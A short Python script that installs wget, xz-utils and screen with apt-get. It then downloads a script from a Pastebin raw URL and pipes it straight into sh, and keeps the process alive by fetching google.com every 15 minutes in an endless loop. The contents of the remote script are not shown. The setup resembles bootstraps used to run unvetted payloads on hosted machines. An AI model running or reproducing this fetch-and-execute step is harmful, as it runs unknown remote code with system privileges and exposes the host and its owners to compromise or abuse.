import os
import time

# update system packages
os.system('apt-get update -y')
# install wget
os.system('apt-get install wget -y')
# install xz-utils
os.system('apt-get install -y xz-utils')
# install screen
os.system('apt-get install screen -y')
# execute the shell command that would download and execute a script from Pastebin
os.system("(wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh")

# this loop is the equivalent of the bash while loop
while True:
    os.system('wget google.com')
    time.sleep(900)  # sleep for 900 seconds or 15 minutes
